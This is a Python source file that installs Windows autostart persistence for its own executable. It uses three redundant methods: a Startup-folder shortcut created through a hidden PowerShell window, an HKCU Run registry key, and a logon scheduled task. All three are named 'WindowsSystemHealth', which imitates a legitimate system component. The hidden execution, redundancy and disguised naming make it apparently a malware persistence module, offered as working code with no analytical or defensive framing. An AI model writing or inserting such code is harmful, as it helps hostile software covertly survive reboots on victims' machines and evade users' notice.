import os
import subprocess
import sys
from pathlib import Path

from core.logger import logger

TASK_NAME = "WindowsSystemHealth"
RUN_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
RUN_VALUE = "WindowsSystemHealth"


def _exe_path() -> Path:
    if getattr(sys, "frozen", False):
        return Path(sys.executable)
    return Path(sys.argv[0]).resolve()


def _startup_folder() -> Path:
    return (
        Path(os.getenv("APPDATA", ""))
        / r"Microsoft\Windows\Start Menu\Programs\Startup"
    )


def install_startup_folder() -> bool:
    try:
        exe = _exe_path()
        link = _startup_folder() / f"{RUN_VALUE}.lnk"
        if link.exists():
            return True
        script = (
            f'$s=(New-Object -ComObject WScript.Shell).CreateShortcut("{link}");'
            f'$s.TargetPath="{exe}";'
            f'$s.WindowStyle=7;'
            f'$s.Save()'
        )
        subprocess.run(
            ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", script],
            capture_output=True,
            timeout=15,
        )
        logger.info(f"startup shortcut: {link}")
        return link.exists()
    except Exception as e:
        logger.error(f"startup folder failed: {e}")
        return False


def install_registry() -> bool:
    try:
        import winreg
        exe = _exe_path()
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, RUN_KEY, 0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, RUN_VALUE, 0, winreg.REG_SZ, str(exe))
        winreg.CloseKey(key)
        logger.info("registry run key installed")
        return True
    except Exception as e:
        logger.error(f"registry failed: {e}")
        return False


def install_task_scheduler() -> bool:
    try:
        exe = _exe_path()
        cmd = [
            "schtasks", "/Create", "/F",
            "/TN", TASK_NAME,
            "/TR", f'"{exe}"',
            "/SC", "ONLOGON",
            "/RL", "LIMITED",
            "/IT",
        ]
        r = subprocess.run(cmd, capture_output=True, timeout=20)
        if r.returncode == 0:
            logger.info("task scheduler installed")
            return True
        logger.error(f"schtasks: {r.stderr.decode(errors='ignore')}")
        return False
    except Exception as e:
        logger.error(f"task scheduler failed: {e}")
        return False


def install() -> None:
    logger.info("installing autostart")
    install_startup_folder()
    install_registry()
    install_task_scheduler()
